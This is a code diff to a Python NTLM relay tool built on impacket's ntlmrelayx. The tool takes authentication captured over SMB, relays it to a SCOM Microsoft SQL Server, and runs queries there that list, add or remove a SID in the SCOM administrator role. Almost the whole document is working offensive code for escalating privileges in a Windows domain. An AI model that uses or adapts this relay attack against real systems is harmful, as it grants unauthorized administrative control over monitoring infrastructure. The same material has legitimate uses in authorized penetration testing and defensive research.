@@ -1,106 +1,82 @@
 import time
 from threading import Lock
-from struct import unpack
 
 from impacket.examples.ntlmrelayx.attacks import ProtocolAttack
-from impacket.examples.ntlmrelayx.clients.mssqlrelayclient import MSSQLRelayClient
 from impacket.examples.ntlmrelayx.servers import SMBRelayServer
 from impacket.examples.ntlmrelayx.utils.config import NTLMRelayxConfig
 from impacket.examples.ntlmrelayx.utils.targetsutils import TargetsProcessor
-from impacket.nt_errors import STATUS_ACCESS_DENIED, STATUS_SUCCESS
 from impacket.ldap import ldaptypes
-from impacket.tds import TDS_ERROR_TOKEN, TDS_INFO_TOKEN, TDS_LOGINACK_TOKEN, TDS_ROW_TOKEN
 
 from lib.logger import logger
 
 
-class SCOMMSSQLRelayClient(MSSQLRelayClient):
-    def __init__(self, *args, **kwargs):
-        super().__init__(*args, **kwargs)
-        self.scom_relay = None
-
-
 class SCOMMSSQLAttackClient(ProtocolAttack):
+    PLUGIN_NAMES = ["MSSQL"]
+    
     def run(self):
         self.scom_relay.attack_lock.acquire()
         try:
             self._run()
         except Exception as e:
             logger.info(f"Something went wrong:\n{e}")
+            import traceback
+            logger.debug(traceback.format_exc())
         finally:
             self.scom_relay.attack_lock.release()
 
     def _run(self):
-        if (hasattr(self.client, 'username')
-            and self.client.username in self.scom_relay.attacked_targets
-        ):
-            logger.debug(
-                "Skipping user %s since attack was already performed"
-                % repr(self.client.username)
-            )
+        # Get username from the client
+        username = self.username if hasattr(self, 'username') else 'Unknown'
+        
+        if username in self.scom_relay.attacked_targets:
+            logger.debug(f"Skipping user {username} since attack was already performed")
             return
 
         try:
-            # Get the username for logging
-            username = getattr(self.client, 'username', 'Unknown')
             logger.info(f"Authenticated as: {username}")
 
             # Execute the appropriate query based on operation mode
             if self.scom_relay.operation_mode == 'list':
                 logger.info("Listing current members of SCOM admin role...")
-                result = self.execute_query(self.scom_relay.query)
-                self.handle_list_result(result)
+                self.execute_query(self.scom_relay.query)
             elif self.scom_relay.operation_mode == 'delete':
                 logger.info(f"Removing SID from SCOM admin role...")
-                result = self.execute_query(self.scom_relay.query)
-                self.handle_modify_result(result, "removed from")
+                self.execute_query(self.scom_relay.query)
+                logger.info(f"\n[+] SID successfully removed from SCOM admin role")
             else:  # update/insert mode
                 logger.info(f"Adding SID to SCOM admin role...")
-                result = self.execute_query(self.scom_relay.query)
-                self.handle_modify_result(result, "added to")
+                self.execute_query(self.scom_relay.query)
+                logger.info(f"\n[+] SID successfully added to SCOM admin role")
 
         except Exception as e:
             logger.info(f"An error occurred during the relay: \n{str(e)}")
+            import traceback
+            logger.debug(traceback.format_exc())
 
         # Mark attack as complete
         self.finish_run()
 
     def execute_query(self, query):
-        """Execute SQL query and return results"""
+        """Execute SQL query using the MSSQL client"""
         try:
             logger.debug(f"Executing query: {query}")
+            # Use the client's sql_query method
             self.client.sql_query(query)
-            
-            # Get the response
-            results = []
+            # Print the results
             self.client.printReplies()
-            self.client.colMeta = []
             self.client.printRows()
-            
-            return results
         except Exception as e:
             logger.info(f"Error executing query: {str(e)}")
-            return None
-
-    def handle_list_result(self, result):
-        """Handle results from listing role members"""
-        logger.info("\n[+] Current members of SCOM admin role (RoleID = 1):")
-        logger.info("=" * 60)
-        
-        # The results will be printed by impacket's printRows()
-        # We just need to provide context
-        logger.info("\nQuery completed successfully")
-
-    def handle_modify_result(self, result, action):
-        """Handle results from insert/delete operations"""
-        logger.info(f"\n[+] SID successfully {action} SCOM admin role")
-        logger.info(f"[+] Target user should now {'have' if action == 'added to' else 'lose'} SCOM administrator privileges")
+            import traceback
+            logger.debug(traceback.format_exc())
 
     def finish_run(self):
-        """Mark the attack as complete and potentially shut down"""
-        if hasattr(self.client, 'username'):
-            self.scom_relay.attacked_targets.append(self.client.username)
-        self.scom_relay.shutdown()
+        """Mark the attack as complete"""
+        username = self.username if hasattr(self, 'username') else 'Unknown'
+        if username != 'Unknown':
+            self.scom_relay.attacked_targets.append(username)
+        # Don't shutdown immediately - let the relay continue for other connections
+        # self.scom_relay.shutdown()
 
 
 class MSSQLSCOMRELAY:
@@ -129,20 +105,17 @@ class MSSQLSCOMRELAY:
         logger.info(f"Operation mode: {self.operation_mode}")
 
         # Set up the relay configuration
-        target_processor = TargetsProcessor(
-            singleTarget=self.target,
-            protocolClients={"MSSQL": self.get_relay_mssql_client}
-        )
+        target_processor = TargetsProcessor(singleTarget=self.target)
 
         config = NTLMRelayxConfig()
         config.setTargets(target_processor)
         config.setAttacks({"MSSQL": self.get_attack_mssql_client})
-        config.setProtocolClients({"MSSQL": self.get_relay_mssql_client})
         config.setListeningPort(port)
         config.setInterfaceIp(interface)
-        config.setSMB2Support = True
+        config.setSMB2Support(True)
         config.setMode("RELAY")
         config.setOutputFile(None)
+        config.setQuery(self.query)  # Set the query in the config
 
         self.server = SMBRelayServer(config)
 
@@ -208,12 +181,8 @@ class MSSQLSCOMRELAY:
         except Exception as e:
             logger.debug(e)
 
-    def get_relay_mssql_client(self, *args, **kwargs):
-        relay_client = SCOMMSSQLRelayClient(*args, **kwargs)
-        relay_client.scom_relay = self
-        return relay_client
-
     def get_attack_mssql_client(self, *args, **kwargs):
+        """Return the attack client for MSSQL"""
         attack_client = SCOMMSSQLAttackClient(*args, **kwargs)
         attack_client.scom_relay = self
         return attack_client
